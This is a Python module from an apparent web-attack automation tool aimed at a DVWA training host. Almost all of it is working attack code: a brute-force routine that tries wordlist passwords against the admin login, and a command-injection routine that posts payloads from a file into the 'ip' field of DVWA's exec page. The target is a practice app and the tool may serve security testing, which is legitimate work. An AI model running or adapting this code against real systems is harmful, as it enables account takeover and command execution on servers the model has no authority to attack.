from attacks.baseClass import AttackSession
import requests
import time
import re
import os
import urllib.parse
import random
from pathlib import Path
from utilities.report import eventHandler

class IRA(AttackSession):
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)

    def authentication(self):
        return super().authentication()
    def attack():
        pass
    def startAttack(self):
        bruteForce("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()
        commandInjection("http://web-dvwa.example.com:30064/",'login.php',self.authPayload).startAttack()

 

class bruteForce(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="Brute Force")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/fasttrack.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url = self.host + "vulnerabilities/brute/index.php?username=admin&password="+line.strip()+"&Login=Login#"
                try:
                    session.get(url)
                    self.events.sendMessage("Successful","Brute Force",line.strip())
                except:
                    self.events.sendMessage("Blocked","Brute Force",line.strip())
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","Brute Force","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","Brute Force","Attack completed")
        self.events.disconnect(self.events.callback,sender="Brute Force")


class commandInjection(AttackSession):
    events = eventHandler()
    events.connect(events.callback,sender="Command Injection")
    def __init__(self, host, authenticationPath, authPayload):
        super().__init__(host, authenticationPath, authPayload)
    
    def authentication(self):
        return super().authentication()
    
    def attack(self,session):
        base_path = Path(__file__)
        file_path = (base_path / "../../payloads/commandinjection.txt").resolve()
        with open(file_path,mode='r',encoding="ISO-8859-1") as f:
            while line := f.readline():
                url =  self.host + "vulnerabilities/exec/index.php"
                try:
                    session.post(url,data="ip="+line.strip())
                    self.events.sendMessage("Successful","Command Injection",line.strip())
                except:
                    self.events.sendMessage("Blocked","Command Injection",line.strip())
        f.close()
    def startAttack(self):
        self.events.sendMessage("Information","Command Injection","Attack started")
        self.attack(self.authentication())
        self.events.sendMessage("Information","Command Injection","Attack completed")
        self.events.disconnect(self.events.callback,sender="Command Injection")